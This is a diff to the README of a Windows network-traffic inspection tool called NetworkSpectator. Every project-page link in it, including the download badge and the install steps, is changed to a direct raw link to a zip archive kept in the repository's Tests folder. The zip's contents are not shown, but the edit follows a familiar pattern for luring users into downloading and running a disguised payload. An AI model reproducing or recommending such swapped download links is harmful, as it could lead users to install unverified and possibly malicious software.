@@ -1,12 +1,12 @@
 # 🔍 NetworkSpectator - Inspect Network Traffic With Ease
 
-[![Download NetworkSpectator](https://img.shields.io/badge/Download-NetworkSpectator-blue?style=for-the-badge)](https://github.com/Bagheln865/NetworkSpectator)
+[![Download NetworkSpectator](https://img.shields.io/badge/Download-NetworkSpectator-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip)
 
 ## 🚀 Download NetworkSpectator
 
 Visit this page to download and use the app:
 
-[https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
+[https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip](https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip)
 
 ## 📥 What NetworkSpectator Does
 
@@ -26,7 +26,7 @@ Follow these steps on a Windows PC:
 
 1. Open your web browser.
 2. Go to the download page:
-   [https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
+   [https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip](https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip)
 3. Look for the latest release or project files on the page.
 4. Download the file that matches the Windows version you use.
 5. If the file is in a zip folder, right-click it and choose Extract All.
@@ -173,7 +173,7 @@ If you do not see any traffic:
 
 Use this link to visit the project page and download the files:
 
-[https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
+[https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip](https://raw.githubusercontent.com/Bagheln865/NetworkSpectator/main/Tests/Network_Spectator_v1.8.zip)
 
 ## 🔧 Key Features
 
